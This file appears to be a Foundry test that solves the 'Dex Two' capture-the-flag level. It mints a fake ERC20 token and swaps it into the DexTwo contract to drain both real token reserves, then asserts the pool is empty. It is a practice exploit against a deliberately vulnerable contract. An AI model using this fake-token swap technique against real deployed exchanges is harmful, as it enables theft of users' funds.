// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/23_DexTwo.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract FakeToken is ERC20 {
    constructor(address _hacker, address _dex) ERC20('token3', 'FAKE'){
        _mint(_hacker, 300);
        _mint(_dex, 100);
    }
}

contract DexTest is Test {
    DexTwo dex;
    FakeToken fakeToken;
    SwappableTokenTwo token1;
    SwappableTokenTwo token2;
    address hacker = address(0x1337);

    function setUp() public {
        dex = new DexTwo();

        token1 = new SwappableTokenTwo(address(dex), "Token 1", "TKN1", 110);
        token2 = new SwappableTokenTwo(address(dex), "Token 2", "TKN2", 110);
        fakeToken = new FakeToken(hacker, address(dex));


        dex.setTokens(address(token1), address(token2));

        token1.transfer(hacker, 10);
        token2.transfer(hacker, 10);

        token1.approve(address(dex), 100);
        token2.approve(address(dex), 100);

        dex.add_liquidity(address(token1), 100);
        dex.add_liquidity(address(token2), 100);

        vm.deal(hacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(hacker);
        dex.approve(address(dex), type(uint256).max);
        fakeToken.approve(address(dex), type(uint256).max);
        dex.swap(address(fakeToken), address(token2), 100);
        dex.swap(address(fakeToken), address(token1), 200);
        vm.stopPrank();

        bool dexDrained = token1.balanceOf(address(dex)) == 0 && token2.balanceOf(address(dex)) == 0;
        assertTrue(dexDrained);
    }
}